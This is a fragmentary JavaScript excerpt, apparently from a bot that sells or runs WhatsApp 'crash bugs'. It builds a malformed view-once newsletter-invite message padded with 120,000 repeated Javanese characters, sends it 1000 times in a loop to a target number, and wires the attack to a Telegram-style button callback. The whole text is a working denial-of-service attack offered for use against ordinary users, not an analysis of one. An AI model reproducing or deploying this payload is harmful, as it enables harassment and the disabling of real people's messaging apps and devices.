...
async function crash34(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
                    ...
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                ...
                                newsletterName: "l📞☠️" + "ꦾ".repeat(120000),
...
async function apaajah(sock, target) {
for (let i = 0; i < 1000; i++) {
await crash34(sock, target)
}
}
...
bot.on("callback_query", async (callbackQuery) => {
  ...
  if (action.startsWith("vx")) {
    try {
      ...
      if (action === "vxcrash_x") {
        await apaajah(sessions.values().next().value, jid);
        bugType = "Demous";
        ...
        await apaya(sessions.values().next().value, jid);
        bugType = "⸸𝘚";
      } else {
